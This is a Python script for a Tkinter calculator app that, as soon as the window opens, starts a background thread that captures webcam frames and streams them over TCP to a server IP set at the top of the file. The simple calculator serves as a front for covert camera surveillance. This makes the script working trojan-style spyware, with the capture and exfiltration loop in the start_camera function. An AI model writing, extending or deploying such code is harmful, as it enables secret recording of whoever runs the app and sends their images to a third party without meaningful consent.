import socket
import cv2
import pickle
import struct
import tkinter as tk
from tkinter import messagebox
import threading

# Client settings
SERVER_IP = '127.0.0.1'  # Replace with your server IP if different
SERVER_PORT = 9999       # Server port
camera_active = True     # Flag to control the camera

# Function to start camera and send frames to the server
def start_camera():
    global camera_active
    # Set up a TCP socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_IP, SERVER_PORT))

    # Initialize the camera
    cap = cv2.VideoCapture(0)

    while camera_active and cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            print("Failed to grab frame")
            break

        # Encode the frame
        encoded, buffer = cv2.imencode('.jpg', frame)
        if not encoded:
            print("Failed to encode frame")
            break

        # Serialize the frame data
        frame_data = pickle.dumps(buffer)

        # Send the length of the serialized data followed by the data itself
        message_size = struct.pack("L", len(frame_data))
        client_socket.sendall(message_size + frame_data)

    cap.release()
    client_socket.close()

# Calculator functions
def add(x, y):
    return x + y

def subtract(x, y):
    return x - y

def multiply(x, y):
    return x * y

def divide(x, y):
    if y == 0:
        return "Error: Division by zero"
    return x / y

# Function to perform calculation
def calculate():
    try:
        num1 = float(entry_num1.get())
        num2 = float(entry_num2.get())
        operator = combo_operator.get()

        if operator == '+':
            result = add(num1, num2)
        elif operator == '-':
            result = subtract(num1, num2)
        elif operator == '*':
            result = multiply(num1, num2)
        elif operator == '/':
            result = divide(num1, num2)
        else:
            messagebox.showerror("Error", "Invalid operator")
            return

        label_result.config(text=f"Result: {result}")
    except ValueError:
        messagebox.showerror("Error", "Please enter valid numbers.")

# Function to start the camera recording in a separate thread
def start_camera_thread():
    camera_thread = threading.Thread(target=start_camera)
    camera_thread.start()

# Function to handle app closure, stopping the camera and exiting gracefully
def on_closing():
    global camera_active
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        camera_active = False  # Stop camera recording
        root.destroy()         # Close the calculator

# Initialize the main window (Calculator GUI)
root = tk.Tk()
root.title("Simple Calculator with Camera Recording")

# Calculator GUI Elements
frame_calc = tk.Frame(root)
frame_calc.pack(padx=10, pady=10)

entry_num1 = tk.Entry(frame_calc)
entry_num1.grid(row=0, column=0, padx=5, pady=5)

combo_operator = tk.StringVar()
combo_operator.set('+')  # Default operator
operator_menu = tk.OptionMenu(frame_calc, combo_operator, '+', '-', '*', '/')
operator_menu.grid(row=0, column=1, padx=5, pady=5)

entry_num2 = tk.Entry(frame_calc)
entry_num2.grid(row=0, column=2, padx=5, pady=5)

btn_calculate = tk.Button(frame_calc, text="Calculate", command=calculate)
btn_calculate.grid(row=0, column=3, padx=5, pady=5)

label_result = tk.Label(frame_calc, text="Result:")
label_result.grid(row=1, column=0, columnspan=4)

# Start camera recording automatically in a separate thread when the GUI starts
start_camera_thread()

# Bind the closing event to stop the camera and close the app
root.protocol("WM_DELETE_WINDOW", on_closing)

# Start the GUI main loop
root.mainloop()